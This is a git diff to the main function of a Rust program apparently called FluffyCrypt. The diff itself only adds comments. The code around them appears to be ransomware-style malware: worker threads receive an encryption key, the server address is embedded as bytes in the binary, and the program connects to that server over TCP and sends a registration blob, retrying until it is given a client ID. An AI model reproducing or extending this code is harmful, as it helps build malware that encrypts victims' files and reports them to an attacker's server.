@@ -39,6 +39,7 @@ const SERVER_IP: &[u8] = include_bytes!("..\\ip-port.bin");
 
 #[tokio::main]
 async fn main() {
+    // set up monitor
     let mut disable_cryptography = false;
     let mut builder = Subscriber::builder();
     if Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_DEV") {
@@ -102,6 +103,7 @@ async fn main() {
 
         event!(Level::INFO, "-- REACHED STAGE: Worker Start --");
         for _ in 0..THREADS {
+            // start workers
             let thread_reciever = r.clone();
             let thread_key = key.clone();
             threads.push(tokio::spawn(async move {
@@ -131,15 +133,17 @@ async fn main() {
 
     let addr = ip.parse().unwrap();
 
+    // set up networking primitives
     let socket = TcpSocket::new_v4().unwrap();
     let mut stream = socket.connect(addr).await.unwrap();
     let mut read_buff = vec![0; 1024];
-    event!(Level::DEBUG, "-- REACHED STAGE: Transmission Start --");
 
+    event!(Level::DEBUG, "-- REACHED STAGE: Transmission Start --");
     loop {
         event!(Level::DEBUG, "Waiting for stream to become writable...");
         if stream.writable().await.is_ok() {
             event!(Level::DEBUG, "Stream is writable, transmitting!");
+            // transmit registration request
             let len = stream.try_write(&register_blob);
             if len.is_err() {
                 event!(Level::ERROR, "Error detected, retrying after 1ms.");
@@ -205,6 +209,7 @@ async fn main() {
                     continue;
                 }
                 Message::Accepted(_) => {
+                    // registration accepted, no need to retry
                     event!(
                         Level::INFO,
                         "Transmission Successful. Client ID is: {}. This application will now exit.",
